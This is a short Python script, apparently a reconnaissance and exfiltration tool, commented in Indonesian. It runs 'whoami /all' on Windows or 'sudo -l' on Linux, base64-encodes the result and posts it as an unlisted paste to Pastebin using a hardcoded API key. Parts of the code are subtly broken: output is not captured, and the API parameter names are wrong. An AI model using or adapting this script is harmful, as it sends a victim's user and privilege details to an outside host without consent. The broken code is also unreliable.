import subprocess
import base64
import requests
import platform

# referensi
# ===========
# https://pastebin.com/doc_api#1
# https://books.google.co.id/books?id=V4XwDwAAQBAJ&pg=PA146&lpg=PA146&dq=pastebin+getting+a+users+information+and+settings+in+python&source=bl&ots=xzhgBYT70T&sig=ACfU3U1eyTUmn4r1ZkWv2K8IkVA-KIFnzg&hl=en&sa=X&ved=2ahUKEwjzrPnn-uX0AhWZ63MBHfSMAEgQ6AF6BAgbEAM#v=onepage&q=pastebin%20getting%20a%20users%20information%20and%20settings%20in%20python&f=false

text = "Hasil result: \n"
# untuk melakukan system check
if platform.system() == 'Windows':
    process = subprocess.Popen('whoami /all', stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    res, error = process.communicate()
    print(res)

elif platform.system() == 'Linux':
    process = subprocess.Popen('sudo -l', stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    res, error = process.communicate()
    print(res)

# url login untuk mendapatkan api user, username, userpassword
log_url = 'https://pastebin.com/api/api_login.php'
log_data = {
    'pastebin_api': "pYa2W8sTgvLlfwrCUdT6K_HscP16dbj6",
    'username': '',
    'password': ''
}

req = requests.post(log_url, data=log_data)
print(req.text)

# url untuk mengirimkan/upload (POST) pastein API key [untuk membuat sebuah paste baru]
url = 'https://pastebin.com/api/api_post.php'

api_data = {
    # berisikan API yang dimiliki dari pastebin
    'pastebin_api': "pYa2W8sTgvLlfwrCUdT6K_HscP16dbj6",
    'api_paste_code': base64.b64encode(res),
    # mode pada api paste 
    # 0 => public; 1 => unlisted; 2 => private
    'paste_mode': 1,
    # Paste text kita
    'api_user_key': ''
    }

# melakukan request untuk post api_data
send = requests.post(url,data=api_data)
print(send.text)

